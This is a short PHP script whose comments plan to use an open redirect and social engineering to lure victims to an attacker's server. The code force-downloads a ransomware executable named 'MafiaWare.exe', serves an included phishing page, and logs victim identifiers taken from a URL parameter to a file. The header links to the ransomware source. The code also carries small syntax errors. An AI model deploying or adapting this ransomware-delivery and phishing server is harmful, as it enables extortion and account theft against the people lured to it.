<?php
/**
 * "what we do for open redirect ?"
 * it's my question for my brain
 * first i think about open redirect is malware and ransomeware.
 * we can create ransomware and upload to our server and then social enggenering with victim.
 * when victim clik link we send, and when victim clik whatever in my server, my server was send download file to the victim.
 * ransomeware MafiaWare @link https://pastebin.com/0RWjbxxY
 * two, is the phising attack, and it's potential to steal account users
 */

class KonTol{

	public $filename,$victim,;

	public function send_download(){
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($this->filename).'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Content-Length: '.filesize($this->filename));
		flush();
		readfile($this->filename);
		exit;
	}

	public function get_stupid_victim(){
		$p = fopen("you-get-stupid-victim.txt",'a+');
		fwrite($p, $this->victim."\n");
		fclose($p)
	}

	public function phising(){
		return include("phising/index.php");
	}
}

$x = new KonTol;
$x->filename = "MafiaWare.exe";
	if(isset($_GET['download'])){
		$x->send_download();
	}
	elseif(isset($_GET['phising'])){
		$x->phising();
	}
	elseif(isset($_GET['g0tnew'])){
		$x->victim = $_GET['g0tnew'];
		$x->get_stupid_victim();
	}
